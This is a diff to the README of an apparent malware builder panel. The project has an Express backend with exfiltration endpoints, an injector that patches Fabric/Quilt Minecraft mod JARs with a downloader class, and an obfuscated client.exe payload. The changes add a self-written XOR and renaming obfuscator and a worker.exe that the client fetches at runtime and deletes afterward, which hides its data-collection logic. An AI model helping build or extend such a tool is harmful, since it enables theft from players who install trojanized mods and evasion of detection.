@@ -11,7 +11,7 @@ into a browsable log panel.
 |------------|---------|
 | `server/`  | Express backend: auth (JWT), dashboard API, exfiltration endpoints, build orchestration, SQLite storage |
 | `builder/` | JAR injector: compiles `UpdaterV2.java`, patches a Fabric/Quilt mod's entrypoint with ASM, optional obfuscation |
-| `payload/` | Client template (`test.js`) compiled to `client.exe` via `@yao-pkg/pkg` |
+| `payload/` | Client templates (`test.js` → `client.exe`, `worker.js` → `worker.exe`) compiled via `@yao-pkg/pkg`; `obfuscate.js` is the self-contained JS obfuscator |
 | `of/`      | Folded-in Gradle project that builds the `fabric-obf` obfuscator (JDK 21) |
 | `builds/`  | Per-user build outputs (gitignored, generated at build time) |
 
@@ -29,7 +29,8 @@ at boot if any are missing rather than falling back to defaults.
 
 Optional env: `PORT`, `JWT_SECRET` (isolate session signing from the payload
 XOR key), `DB_PATH` (defaults to `server/database.sqlite`),
-`ALLOWED_BUILD_IDS` (comma-separated allowlist).
+`ALLOWED_BUILD_IDS` (comma-separated allowlist), `BUILDS_DIR` (overrides where
+per-user build artifacts land; default `builds/`), `UPLOADS_DIR`, `SHARED_FILES_DIR`, `PAYLOADS_DIR`.
 
 `server/.env` is gitignored. Never commit `.env`.
 
@@ -38,18 +39,27 @@ XOR key), `DB_PATH` (defaults to `server/database.sqlite`),
 `POST /api/build/generate` (admin):
 
 1. Reads `payload/test.js`, replaces the `PLACEHOLDER_*` tokens with the user's
-   ID, the server's host URL, and the real API/SECRET keys from the environment.
-2. **Obfuscates the payload JS** with `payload/obfuscate.js`
-   (`javascript-obfuscator`, devDependency) before compilation. Disable with
-   `OBFUSCATE_JS=0`; `JS_OBSCURE_LEVEL` picks `light`/`full` (default `full`).
-   The option set is tuned for pkg: string arrays, `splitStrings` and
-   `deadCodeInjection` are left off because they fold `require()` paths into
-   index lookups that break pkg's static bundler — the pipeline verifies every
-   `require()` literal survives (`--check`) and kills the build if one is lost.
+   ID, the server's host URL, the real API/SECRET keys from the environment,
+   and the per-build worker download URL.
+2. **Obfuscates the payload JS** with `payload/obfuscate.js` — a self-contained
+   tokenizer/transformer (no third-party dependency). `light` strips comments,
+   collapses whitespace, and hides string/number/object-key members behind XOR
+   tables with computed `[dec(i)]` lookups; the default `full` level also
+   renames every declared identifier to collision-free `_0x…` names — including
+   destructured bindings, method/accessor keys, and template literal contents.
+   `require()` argument literals are never encoded: the pipeline verifies every
+   path still appears verbatim in the output and aborts the build if one is
+   lost (pkg's static bundler depends on them). Disable with `OBFUSCATE_JS=0`;
+   `JS_OBSCURE_LEVEL` picks `light`/`full` (default `full`).
 3. Compiles the payload with the **locally installed** `@yao-pkg/pkg`
    (devDependency of `payload/`) → `builds/user_{id}/dist/client.exe`. No per-
    build network fetch.
-4. Runs `node builder/index.js <mod.jar> <userId> <dist> <updateUrl>` which:
+4. Compiles the **worker** (`payload/worker.js`, same substitution +
+   obfuscation, so heavy collection logic never ships inside the client exe)
+   → `builds/user_{id}/dist/worker.exe`, downloadable at
+   `/api/payloads/download/{userId}/worker.exe`. The deployed client fetches it
+   into a random temp slot at runtime and deletes it after the run.
+5. Runs `node builder/index.js <mod.jar> <userId> <dist> <updateUrl>` which:
    - downloads ASM `lib/asm-9.6.jar` from Maven Central on first use
      (binary artifact is gitignored),
    - compiles `ByteCodeInjector.java` when the `.class` is missing,
@@ -58,7 +68,7 @@ XOR key), `DB_PATH` (defaults to `server/database.sqlite`),
      injected class** — no third-party mod. This is the default "Default
      template" build; passing a custom uploaded jar disables it),
    - embeds `user_id.txt`.
-5. Optionally obfuscates the result with `of/build/libs/fabric-obf.jar`
+6. Optionally obfuscates the result with `of/build/libs/fabric-obf.jar`
    (`OBF2_JAR` env overrides the default path). If the obfuscator jar is absent
    the build keeps the injected JAR and continues — obfuscation never aborts a
    valid injection.
